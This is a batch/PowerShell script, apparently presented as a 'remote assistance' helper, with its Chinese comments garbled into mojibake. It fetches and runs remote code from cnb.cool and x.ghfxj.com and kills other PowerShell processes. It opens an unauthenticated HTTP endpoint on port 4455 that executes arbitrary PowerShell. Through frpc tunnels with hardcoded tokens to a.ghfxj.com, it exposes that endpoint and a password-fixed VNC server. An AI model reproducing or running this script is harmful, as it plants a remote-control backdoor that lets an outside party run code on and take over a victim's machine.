#@&cls&set cd=%~dp0&powershell -EP Bypass "gc '%~f0' -enc UTF8|out-string|iex"&&exit||pause&exit
#$ErrorActionPreference = 'Stop'; cd $env:temp; [Environment]::CurrentDirectory = $pwd
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

iex(irm https://cnb.cool/GHFXJ/PS/-/git/raw/main/Func/.Check.ps1)
$cd = FindOrCreateFolder "___GHFXJ___" "YC"
if ($cd) {
    cd $cd; [Environment]::CurrentDirectory = $cd
} else {
    Write-Host "æœªæ‰¾åˆ°åˆé€‚çš„å›ºå®šç¡¬ç›˜åˆ†åŒºï¼Œæ— æ³•è®¾ç½®å·¥ä½œè·¯å¾„ã€‚" -ForegroundColor Red
}
iex(irm https://cnb.cool/GHFXJ/PS/-/git/raw/main/Func/.Utils.ps1)
$yc = @'
#@&cls&set cd=%~dp0&powershell -EP Bypass "gc '%~f0' -enc UTF8|out-string|iex"&&exit||pause&exit
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(irm x.ghfxj.com)
'@
[IO.File]::WriteAllText("__æ‰“å¼€è¿œç¨‹ååŠ©.bat", $yc)

#âœ… ç¡®ä¿ tvnserver
Ensure-App "tvnserver", "frpc"

#âœ…1 å¼ºåˆ¶ç»“æŸæ‰€æœ‰ frps è¿›ç¨‹ï¼ˆå¿½ç•¥é”™è¯¯ï¼Œè‹¥è¿›ç¨‹ä¸å­˜åœ¨åˆ™ç»§ç»­ï¼‰
gps powershell -EA 0 | ? Id -ne $pid | kill -Force
Stop-Process -Name frpc -Force -EA 0
Stop-Process -Name tvnserver -Force -EA 0

#âœ… ===== å¯åŠ¨ 4455 ç«¯å£çš„ HTTP ä»£ç æ‰§è¡ŒæœåŠ¡ï¼ˆè¿”å›çº¯æ–‡æœ¬ï¼‰ =====
# æ¸…ç†å¯èƒ½æ®‹ç•™çš„åŒåä½œä¸šï¼ˆé˜²æ­¢ç«¯å£å ç”¨ï¼‰
Get-Job -Name "HttpService4455" -ErrorAction SilentlyContinue | Stop-Job -PassThru | Remove-Job

# å®šä¹‰åå°ä½œä¸šè„šæœ¬å—
$httpJob = Start-Job -Name "HttpService4455" -ScriptBlock {
    param($workingDir)
    Set-Location $workingDir

    $Port = 4455
    $Prefix = "http://+:$Port/"

    $listener = [System.Net.HttpListener]::new()
    $listener.Prefixes.Add($Prefix)

    try {
        $listener.Start()
        Write-Host "HTTP æœåŠ¡å·²å¯åŠ¨ï¼Œç›‘å¬ç«¯å£ $Port" -ForegroundColor Green

        while ($true) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response

            # ä»…å¤„ç† POST /execPsCode
            if ($request.HttpMethod -ne 'POST' -or $request.Url.AbsolutePath -ne '/execPsCode') {
                $response.StatusCode = 404
                $response.Close()
                continue
            }

            # å¿…é¡»ä¸º JSON æ ¼å¼
            if ($request.ContentType -notlike 'application/json*') {
                $response.StatusCode = 415
                $response.Close()
                continue
            }

            # è¯»å–è¯·æ±‚ä½“
            $reader = [System.IO.StreamReader]::new($request.InputStream, $request.ContentEncoding)
            $body = $reader.ReadToEnd()
            $reader.Close()

            # è§£æ JSON
            try {
                $payload = $body | ConvertFrom-Json -ErrorAction Stop
            } catch {
                $errorMsg = "JSON è§£æé”™è¯¯: $($_.Exception.Message)"
                $bytes = [Text.Encoding]::UTF8.GetBytes($errorMsg)
                $response.StatusCode = 400
                $response.ContentType = 'text/plain; charset=utf-8'
                $response.ContentLength64 = $bytes.Length
                $response.OutputStream.Write($bytes, 0, $bytes.Length)
                $response.OutputStream.Close()
                continue
            }

            # å¿…é¡»åŒ…å« powershellCode å­—æ®µ
            if (-not $payload.powershellCode) {
                $errorMsg = "ç¼ºå°‘ 'powershellCode' å­—æ®µ"
                $bytes = [Text.Encoding]::UTF8.GetBytes($errorMsg)
                $response.StatusCode = 400
                $response.ContentType = 'text/plain; charset=utf-8'
                $response.ContentLength64 = $bytes.Length
                $response.OutputStream.Write($bytes, 0, $bytes.Length)
                $response.OutputStream.Close()
                continue
            }

            $code = $payload.powershellCode
            $output = ''

            # æ‰§è¡Œä¼ å…¥çš„ PowerShell ä»£ç 
            try {
                # ä½¿ç”¨ Out-String -Stream é¿å…æ ¼å¼åŒ–å¡«å……ç©ºæ ¼ï¼Œå†ç”¨æ¢è¡Œç¬¦è¿æ¥
                $lines = Invoke-Expression $code 2>&1 | Out-String -Stream
                $output = $lines -join "`r`n"
            } catch {
                # æ•è·ç»ˆæ­¢é”™è¯¯ï¼ˆå¦‚è¯­æ³•é”™è¯¯ï¼‰
                $output = "é”™è¯¯: $($_.Exception.Message)"
            }

            # è¿”å›çº¯æ–‡æœ¬è¾“å‡º
            $bytes = [Text.Encoding]::UTF8.GetBytes($output)
            $response.StatusCode = 200
            $response.ContentType = 'text/plain; charset=utf-8'
            $response.ContentLength64 = $bytes.Length
            $response.OutputStream.Write($bytes, 0, $bytes.Length)
            $response.OutputStream.Close()
        }
    } catch {
        Write-Host "HTTP æœåŠ¡é”™è¯¯: $_" -ForegroundColor Red
    } finally {
        if ($listener.IsListening) { $listener.Stop() }
    }
} -ArgumentList $pwd

# çŸ­æš‚ç­‰å¾…æœåŠ¡å¯åŠ¨
Start-Sleep -Seconds 1

#âœ…2 å®šä¹‰ TOML é…ç½®å†…å®¹å¹¶ä¿å­˜åˆ°å½“å‰ç›®å½•ä¸‹çš„ Frps.toml æ–‡ä»¶ä¸­
$toml = @'
serverAddr = "a.ghfxj.com"
serverPort = 7000
auth.token = "Ghfxj007"
loginFailExit = false
[[proxies]]
type = "stcp"
name = "qm4455_server"
secretKey = "Ghfxj4455"
localIP = "127.0.0.1"
localPort = 4455
[[proxies]]
type = "stcp"
name = "vnc5900_server"
secretKey = "Ghfxj5900"
localIP = "127.0.0.1"
localPort = 5900
'@
[IO.File]::WriteAllText("frpc.toml", $toml)

#âœ…3 ä¸æ‰“å¼€æ–°çª—å£å¯åŠ¨ frpsï¼Œä½¿ç”¨åˆšç”Ÿæˆçš„é…ç½®æ–‡ä»¶
Start-Process -FilePath "frpc" -ArgumentList "-c frpc.toml" -NoNewWindow -WorkingDirectory $pwd

# ç”Ÿæˆ tvnv é…ç½®æ–‡ä»¶
$tvns = @'
[server]
RunControlInterface=1
UseControlAuthentication=0
RepeatControlAuthentication=1
ExtraPorts=
QueryTimeout=30
QueryAcceptOnTimeout=0
LocalInputPriorityTimeout=3
LocalInputPriority=0
BlockRemoteInput=0
BlockLocalInput=0
IpAccessControl=
RfbPort=0x170c
HttpPort=0x16a8
DisconnectAction=0
AcceptRfbConnections=1
UseVncAuthentication=1
LoopbackOnly=0
AcceptHttpConnections=0
LogLevel=0
EnableFileTransfers=1
RemoveWallpaper=1
UseD3D=1
UseMirrorDriver=1
EnableUrlParams=1
Password=C6930EB33F721FF9
AlwaysShared=0
NeverShared=0
DisconnectClients=1
PollingInterval=1000
AllowLoopback=1
VideoRecognitionInterval=3000
GrabTransparentWindows=1
SaveLogToAllUsersPath=0
ConnectToRdp=0
IdleTimeout=0
VideoClasses=
VideoRects=
ControlPassword=C6930EB33F721FF9
'@
[IO.File]::WriteAllText("tvnserver.ini", $tvns)

$host.UI.RawUI.WindowTitle = "FRP_VNCè¿œç¨‹å·²å°±ç»ª..."
cls
echo "`n`n...è¿œç¨‹å‡†å¤‡å·²å°±ç»ª...è¯·è”ç³»(å¾®ä¿¡|QQ)å®¢æœ(320261661)æ¥ååŠ©æ‚¨è§£å†³é—®é¢˜ï¼" -ForegroundColor Green
"ä»¥å, æ‚¨å¯ä»¥é€šè¿‡æ‰“å¼€ ğŸ‘‰ $cd\__æ‰“å¼€è¿œç¨‹ååŠ©.bat ğŸ‘ˆ æ–‡ä»¶å¯åŠ¨è¿œç¨‹ï¼`n`n"

#âœ…4 å¯åŠ¨tvnserver
Start-Process -FilePath "tvnserver.exe" -ArgumentList "-run" -NoNewWindow -WorkingDirectory $pwd -wait







